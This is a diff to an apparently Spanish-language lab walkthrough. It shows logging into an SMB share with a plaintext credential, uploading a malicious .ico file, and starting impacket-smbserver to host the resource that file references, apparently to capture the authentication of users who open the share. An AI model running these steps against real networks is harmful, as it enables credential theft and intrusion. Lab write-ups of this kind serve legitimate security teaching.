@@ -14,7 +14,7 @@ Despues podríamos conectarnos al recurso compartido a nivel de red en el cual t
 ```
 smbclient -U "wizcorp.local\WizzzStark%Password1" //192.168.46.130/SharedFiles
 ```
-Una vez dentro de la sesión interactica podemos subir el archivo con 'put file.ico' y posteriormente nos ponemos en escucha con `smbserver` para crear el recurso que indicamos en el archivo malicioso
+Una vez dentro de la sesión interactica podemos subir el archivo con `put file.ico` y posteriormente nos ponemos en escucha con `smbserver` para crear el recurso que indicamos en el archivo malicioso
 ```
 impacket-smbserver smbFolder $(pwd) -smb2support
 ```
